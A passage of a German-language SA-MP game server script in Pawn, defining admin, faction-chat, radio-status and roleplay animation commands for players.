	ShowPlayerDialog(playerid,DIALOG_SKINWAHL,DIALOG_STYLE_MSGBOX,"Skin auswählen","Welchen Skin möchtest du tragen?","Zivilist","Fraktion");
    return 1;
}
cmd:gebeskin(playerid,params[])
{
    printf("%s gebeskin",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    new skin;
    if(sscanf(params,"ri", giveplayerid,skin)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebeskin [Name/ID] [0-299]");
    //if(skin < 0 || skin > 312) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebeskin [Name/ID] [0-312]");
    if(SpielerInfo[giveplayerid][uLeiter] == 0 && SpielerInfo[giveplayerid][uMitglied] == 0)
    {
        SetPlayerSkin(giveplayerid,skin);
		SpielerInfo[giveplayerid][uZiviSkin] = skin;
		SpielerInfo[giveplayerid][uZiviFrak] = 0;
		SendClientMessage(giveplayerid,COLOR_GREEN,"Dir wurde ein Zivilistenskin gesetzt!");
    }
    else
    {
		SetPlayerSkin(giveplayerid,skin);
		SpielerInfo[giveplayerid][uSkin] = skin;
		SpielerInfo[giveplayerid][uZiviFrak] = 1;
		SendClientMessage(giveplayerid,COLOR_GREEN,"Dir wurde ein Fraktionsskin gesetzt!");
	}
    return 1;
}
cmd:zukoords(playerid,params[])
{
    printf("%s zukoords",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    new Float:X,Float:Y,Float:Z;
    if(sscanf(params,"p<,>fff", X,Y,Z)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zukoords [X Y Z]");
    Teleport(playerid,X,Y,Z);
    return 1;
}
cmd:koords(playerid,params[])
{
    printf("%s koords",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    new Float:X,Float:Y,Float:Z,string[100];
    GetPlayerPos(playerid,X,Y,Z);
    format(string,sizeof string,"X: %f, Y: %f, Z: %f",X,Y,Z);
    SendClientMessage(playerid,COLOR_GREEN,string);
    return 1;
}
//Fraktion
cmd:einladen(playerid,params[])
{
    printf("%s einladen",PlayerName(playerid));
	if(SpielerInfo[playerid][uLeiter] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Leader!");
	if(sscanf(params, "r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /einalden [Name/ID]");
	if(SpielerInfo[giveplayerid][uMitglied] != 0 || SpielerInfo[giveplayerid][uLeiter] != 0) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist schon in einer Fraktion!");
	Eingeladen[giveplayerid] = SpielerInfo[playerid][uLeiter];
	new string[150];
	format(string,sizeof string,"%s hat dich in die Fraktion %s eingeladen.",PlayerName(playerid),Fraktionen[SpielerInfo[playerid][uLeiter]]);
	ShowPlayerDialog(giveplayerid, Frak_Einladung, DIALOG_STYLE_MSGBOX,"Einladung",string,"Annehmen","Ablehnen");
	format(string,sizeof string,"Du hast %s in die Fraktion %s eingeladen.",PlayerName(giveplayerid),Fraktionen[SpielerInfo[playerid][uLeiter]]);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	return 1;
}
cmd:ausladen(playerid,params[])
{
	printf("%s ausladen",PlayerName(playerid));
	if(SpielerInfo[playerid][uLeiter] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Leader!");
	if(sscanf(params, "r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /ausladen [Name/ID]");
	if(SpielerInfo[giveplayerid][uMitglied] != SpielerInfo[playerid][uLeiter]) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler ist nicht Mitglied deiner Fraktion!");
	new string[150];
	format(string,sizeof string,"%s hat dich aus der Fraktion ausgeladen.",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du hast %s ausgeladen.",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	SpielerInfo[giveplayerid][uMitglied] = 0;
	SpielerInfo[giveplayerid][uRang] = 0;
	SetPlayerSkin(giveplayerid,3); //ZiviSkin
	SpielerInfo[giveplayerid][uSkin] = 3;
	SpielerInfo[giveplayerid][uZiviSkin] = 3;
	SpielerInfo[playerid][uZiviFrak] = 0;
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	new string2[2];
	format(string2,2,"%d",SpielerInfo[giveplayerid][uMitglied]);
	mysqlupdate("user",string,"Mitglied",string2);
	
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	format(string2,2,"%d",SpielerInfo[giveplayerid][uRang]);
	mysqlupdate("user",string,"Rang",string2);
	return 1;
}
cmd:geberang(playerid,params[])
{
    printf("%s geberang",PlayerName(playerid));
	new rang,string[150];
	if(SpielerInfo[playerid][uLeiter] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Leader!");
	if(sscanf(params, "rd", giveplayerid,rang)) return SendClientMessage(playerid,COLOR_RED,"Benutze /geberang [Name/ID] [Rang]");
	if(SpielerInfo[giveplayerid][uMitglied] != SpielerInfo[playerid][uLeiter] && SpielerInfo[giveplayerid][uLeiter] != SpielerInfo[playerid][uLeiter]) return SendClientMessage(playerid,COLOR_RED,"Dieser Spieler ist nicht Mitglied deiner Fraktion!");
	if(rang < 1 || rang > 8) { format(string,sizeof string,"Die Ränge gehen nur von 1-8!"); SendClientMessage(playerid,COLOR_RED,string); return 1; }
	if(rang >= SpielerInfo[giveplayerid][uRang])
	{
		format(string,sizeof string,"%s hat dich zu Rang %d befördert.",PlayerName(playerid),rang);
		SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
		format(string,sizeof string,"Du hast %s zu Rang %d befördert.",PlayerName(giveplayerid),rang);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
		format(string,sizeof string,"UPDATE `user` SET Rang='%d' WHERE userID='%d'",SpielerInfo[giveplayerid][uRang],SpielerInfo[giveplayerid][uID]);
		mysql_query(dbhandle, string);
	}
	else
	{
		format(string,sizeof string,"%s hat dich zu Rang %d degradiert.",PlayerName(playerid),rang);
		SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
		format(string,sizeof string,"Du hast %s zu Rang %d degradiert.",PlayerName(giveplayerid),rang);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
		format(string,sizeof string,"UPDATE `user` SET Rang='%d' WHERE userID='%d'",SpielerInfo[giveplayerid][uRang],SpielerInfo[giveplayerid][uID]);
		mysql_query(dbhandle, string);
	}
	SpielerInfo[giveplayerid][uRang] = rang;
	
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	new string2[10];
	format(string2,10,"%d",SpielerInfo[giveplayerid][uRang]);
	mysqlupdate("user",string,"Rang",string2);
	return 1;
}
//allgemein
cmd:afk(playerid,params[])
{
    printf("%s afk",PlayerName(playerid));
	SpielerInfo[playerid][uAFK] = 300;
	return 1;
}
cmd:zuruck(playerid,params[]) return CallLocalFunction("cmd_back","d",playerid);
cmd:zurueck(playerid,params[]) return CallLocalFunction("cmd_back","d",playerid);
cmd:back(playerid,params[])
{
    printf("%s back",PlayerName(playerid));
	if(SpielerInfo[playerid][uAFK] > 289)
	{
		SpielerInfo[playerid][uAFK] = 0;
		SendClientMessage(playerid,COLOR_GREEN,"Du bist nun nicht mehr AFK!");
		if(SpielerInfo[playerid][uTod] == 0) Unfreeze(playerid);
	}
	return 1;
}
cmd:o(playerid,params[])
{
    printf("%s o",PlayerName(playerid));
	new string[256];
	if(OCAus == 1) return SendClientMessage(playerid,COLOR_RED,"Der O-Chat ist ausgeschaltet!");
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[256]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /o [Text]");
    format(string, sizeof(string), "[Global] %s: %s", PlayerName(playerid), string);
	SendMessageToAll(COLOR_OOC,string);
    return 1;
}
cmd:ochat(playerid,params[])
{
    printf("%s ochat",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    if(OCAus == 1)
    {
		OCAus = 0;
		SendFormatMessageToAll(COLOR_GREEN,"%s hat den O-Chat eingeschaltet!",PlayerName(playerid));
    }
    else
    {
        OCAus = 1;
		SendFormatMessageToAll(COLOR_GREEN,"%s hat den O-Chat ausgeschaltet!",PlayerName(playerid));
    }
	return 1;
}
cmd:s(playerid,params[])
{
    printf("%s s",PlayerName(playerid));
	new string[128];
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /s [Text]");
    SetPlayerChatBubble(playerid, string, COLOR_RED, 20.0, 3000);
    format(string, sizeof(string), "%s schreit: %s", PlayerName(playerid), string);
	SendRadiusMessage(playerid,20.0,string,COLOR_RED);
    return 1;
}
cmd:me(playerid,params[])
{
    printf("%s me",PlayerName(playerid));
	new string[128];
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /me [Text]");
    SetPlayerChatBubble(playerid, string, COLOR_RED, 20.0, 3000);
    format(string, sizeof(string), "%s %s", PlayerName(playerid), string);
	SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
    return 1;
}
cmd:m(playerid,params[])
{
    printf("%s m",PlayerName(playerid));
	new string[128];
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /m [Text]");
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,15) && !IstSpielerInFrak(playerid,2) && !IstSpielerInFrak(playerid,3)&& !IstSpielerInFrak(playerid,13) && !IstSpielerInFrak(playerid,4)&& !IstSpielerInFrak(playerid,14)) return SendClientMessage(playerid,COLOR_RED,"Du kannst das Megafon nicht benutzen!");
    if(IstSpielerInFrak(playerid,1))
	{
		format(string, sizeof(string), "[POLICE] %s: %s",PlayerName(playerid),string);
	}
	else if(IstSpielerInFrak(playerid,2))
	{
		format(string, sizeof(string), "[POLICE] %s: %s",PlayerName(playerid),string);
	}
	else if(IstSpielerInFrak(playerid,3))
	{
	    format(string, sizeof(string), "[Fire & Rescue] %s: %s",PlayerName(playerid),string);
	}
	else if(IstSpielerInFrak(playerid,13))
	{
	    format(string, sizeof(string), "[Medic] %s: %s",PlayerName(playerid),string);
	}
	else if(IstSpielerInFrak(playerid,4) || IstSpielerInFrak(playerid,14))
	{
 		format(string, sizeof(string), "[Fire & Rescue] %s: %s",PlayerName(playerid),string);
	}
	else if(IstSpielerInFrak(playerid,15))
	{
 		format(string, sizeof(string), "[ARMY] %s: %s",PlayerName(playerid),string);
	}
	SendRadiusMessage(playerid,50.0,string,COLOR_YELLOW);
    return 1;
}
cmd:f(playerid,params[])
{
    printf("%s f",PlayerName(playerid));
	new string[128];
	if(SpielerInfo[playerid][uMitglied] == 0 && SpielerInfo[playerid][uLeiter] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!");
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /f [Text]");
    if(SpielerInfo[playerid][uLeiter] != 0)
	{
		format(string, sizeof(string), "%s %s: %s", Rangname[SpielerInfo[playerid][uLeiter]][SpielerInfo[playerid][uRang]][rangname], PlayerName(playerid), string);
		FraktionsNachricht(SpielerInfo[playerid][uLeiter], 0x00FFFAFF, string);
	}
    else
	{
		format(string, sizeof(string), "%s %s: %s", Rangname[SpielerInfo[playerid][uMitglied]][SpielerInfo[playerid][uRang]][rangname], PlayerName(playerid), string);
		FraktionsNachricht(SpielerInfo[playerid][uMitglied], 0x00FFFAFF, string);
	}
    return 1;
}


stock IsPlayerInStateFaction(playerid)
{
	new bool:returnvar = false;
	if(IstSpielerInFrak(playerid,1)  ||
       IstSpielerInFrak(playerid,2)  ||
       IstSpielerInFrak(playerid,3)  ||
       IstSpielerInFrak(playerid,4)  ||
 	   IstSpielerInFrak(playerid,13) ||
       IstSpielerInFrak(playerid,14) ||
       IstSpielerInFrak(playerid,15))
	{
       returnvar = true;
    }
    return returnvar;
}

cmd:funkstatus(playerid,params[])
{
    if(!IsPlayerInStateFaction(playerid))
    {
        SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Staatsfraktion!");
        return 1;
    }
    new status, status_beschreibung[64], string[128];
    if(sscanf(params, "ds", status, status_beschreibung))
    {
        for(new i = 1; i <= GetPlayerPoolSize(); i++)
        {
            if(IsPlayerConnected(i) && IsPlayerInStateFaction(i))
            {
                format(string, sizeof(string), "%s %s: Status %d (%s)", Rangname[SpielerInfo[playerid][uLeiter]][SpielerInfo[playerid][uRang]][rangname], PlayerName(i), SpielerInfo[playerid][funkstatus], SpielerInfo[playerid][funkstatus_beschreibung]);
                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }

        SendClientMessage(playerid, COLOR_RED, "Benutze: /funkstatus [Status] [Beschreibung]");
        return 1;
    }

    SpielerInfo[playerid][funkstatus] = status;
    format(SpielerInfo[playerid][funkstatus_beschreibung], 64, "%s", status_beschreibung);

    format(string, sizeof(string), "Du hast deinen Funkstatus auf %d gesetzt!", status);
    SendClientMessage(playerid, COLOR_GREEN, string);

    format(string, sizeof(string), "%s %s meldet Status %d (%s)", Rangname[SpielerInfo[playerid][uLeiter]][SpielerInfo[playerid][uRang]][rangname], PlayerName(playerid), status, status_beschreibung);
    FraktionsNachricht(1, 0x009BFFFF, string);
    FraktionsNachricht(2, 0x009BFFFF, string);
    FraktionsNachricht(3, 0x009BFFFF, string);
    FraktionsNachricht(4, 0x009BFFFF, string);
    FraktionsNachricht(13, 0x009BFFFF, string);
    FraktionsNachricht(14, 0x009BFFFF, string);
    FraktionsNachricht(15, 0x009BFFFF, string);

    return 1;
}
cmd:fmkfgnrjghgh(playerid,params[])
{
	SetTimer("AusfuhrBla",1000,0);
	return 1;
}
cmd:p(playerid,params[])
{
    printf("%s p",PlayerName(playerid));
	new string[128];
	WFrak(playerid);
	if(Mitglied[playerid] != 1 && Mitglied[playerid] != 2 && Mitglied[playerid] != 3 &&Mitglied[playerid] != 4 &&Mitglied[playerid] != 13 && Mitglied[playerid] != 14 &&Mitglied[playerid] != 15) return SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Staatsfraktion!");
	if(SpielerInfo[playerid][uStumm] == 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht reden, du bist gemuted!");
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /p [Text]");
    if(SpielerInfo[playerid][uLeiter] != 0)
	{
		format(string, sizeof(string), "Staat: [%s] %s: %s", Rangname[SpielerInfo[playerid][uLeiter]][SpielerInfo[playerid][uRang]][rangname], PlayerName(playerid), string);
		FraktionsNachricht(1, 0x009BFFFF, string);
		FraktionsNachricht(2, 0x009BFFFF, string);
		FraktionsNachricht(3, 0x009BFFFF, string);
  		FraktionsNachricht(4, 0x009BFFFF, string);
  		FraktionsNachricht(13, 0x009BFFFF, string);
  		FraktionsNachricht(14, 0x009BFFFF, string);
  		FraktionsNachricht(15, 0x009BFFFF, string);
	}
    else
	{
		format(string, sizeof(string), "[%s] %s: %s", Rangname[SpielerInfo[playerid][uMitglied]][SpielerInfo[playerid][uRang]][rangname], PlayerName(playerid), string);
		FraktionsNachricht(1, 0x009BFFFF, string);
		FraktionsNachricht(2, 0x009BFFFF, string);
		FraktionsNachricht(3, 0x009BFFFF, string);
  		FraktionsNachricht(4, 0x009BFFFF, string);
  		FraktionsNachricht(13, 0x009BFFFF, string);
  		FraktionsNachricht(15, 0x009BFFFF, string);
	}
    return 1;
}
cmd:a(playerid,params[])
{
    printf("%s a",PlayerName(playerid));
	new string[128];
	if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params, "s[128]", string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /a [Text]");
    format(string, sizeof(string), "Adminchat %s: %s", PlayerName(playerid), string);
	SendAdminMessage(COLOR_ADMIN,string,1);
    return 1;
}
cmd:namesoff(playerid,params[])
{
    printf("%s namesoff",PlayerName(playerid));
    for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(playerid, i, false);
    GameTextForPlayer(playerid, "~W~Nametags ~R~aus", 5000, 5);
    return 1;
}
cmd:nameson(playerid,params[])
{
    printf("%s nameon",PlayerName(playerid));
    for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(playerid, i, true);
    GameTextForPlayer(playerid, "~W~Nametags ~G~an", 5000, 5);
    return 1;
}
cmd:animlist(playerid,params[])
{
    printf("%s animlist",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"/handsup, /cellin, /cellout, /drunk, /bomb, /getarrested, /laugh, /lookout, /robman, /crossarms, /lay, /hide, /sit");
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"/vomit, /eat, /wave, /slapass, /deal, /crack, /smokem, /smokef, /groundsit, /chatting, /fucku, /taichi, /drink, /dance[1-4] /animsoff");
	return 1;
}
cmd:swat(playerid,params[])
{
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    new tmpcar = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(tmpcar) == 427 || GetVehicleModel(tmpcar) == 433)
 	{
 		ShowPlayerDialog(playerid, DIALOG_SWAT, DIALOG_STYLE_LIST, "SWAT Rüstung","SWAT Skin\nWeste -3$\nHelm -3$\nDesert Deagle -10$\nMP5 -12$\nM4 -20$\nSniper -15$\nTränengas -5$", "Weiter", "Zurück");
	}
	return 1;
}
cmd:handsup(playerid,params[])
{
    printf("%s handsup",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	return 1;
}
cmd:cellin(playerid,params[])
{
    printf("%s cellin",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CUFFED && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CARRY)
	{
	    Anion[playerid] = 1;
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	}
	return 1;
}
cmd:cellout(playerid,params[])
{
    printf("%s cellout",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CUFFED && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CARRY)
	{
	    Anion[playerid] = 1;
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	}
	return 1;
}
cmd:drunk(playerid,params[])
{
    printf("%s drunk",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
	return 1;
}
cmd:bomb(playerid,params[])
{
    printf("%s bomb",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0); // Place Bomb
	return 1;
}
cmd:getarrested(playerid,params[])
{
    printf("%s getarrested",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
 	ApplyAnimation(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1); // Gun Arrest
 	return 1;
}
cmd:laugh(playerid,params[])
{
    printf("%s laugh",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
  	ApplyAnimation(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0); // Laugh
 	return 1;
}
cmd:lookout(playerid,params[])
{
    printf("%s lookout",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
  	ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0); // Rob Lookout
 	return 1;
}
cmd:robman(playerid,params[])
{
    printf("%s robman",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0); // Rob
	return 1;
}
cmd:crossarms(playerid,params[])
{
    printf("%s crossarms",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, 0); // Arms crossed
	return 1;
}
cmd:lay(playerid,params[])
{
    printf("%s lay",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0); // Lay down
	return 1;
}
cmd:hide(playerid,params[])
{
    printf("%s hide",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0); // Taking Cover
	return 1;
}
cmd:vomit(playerid,params[])
{
    printf("%s vomit",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0); // Vomit BAH!
	return 1;
}
cmd:eat(playerid,params[])
{
    printf("%s eat",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0); // Eat Burger
	return 1;
}
cmd:wave(playerid,params[])
{
    printf("%s wave",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0); // Wave
	return 1;
}
cmd:slapass(playerid,params[])
{
    printf("%s slapass",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0); // Ass Slapping
	return 1;
}
cmd:deal(playerid,params[])
{
    printf("%s deal",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0); // Deal Drugs
	return 1;
}
cmd:crack(playerid,params[])
{
    printf("%s crack",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0); // Dieing of Crack
	return 1;
}
cmd:smokem(playerid,params[])
{
    printf("%s smokem",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Smoke
	return 1;
}
cmd:smokef(playerid,params[])
{
    printf("%s smokef",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid, "SMOKING", "F_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Female Smoking
	return 1;
}
cmd:groundsit(playerid,params[])
{
    printf("%s groundsit",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
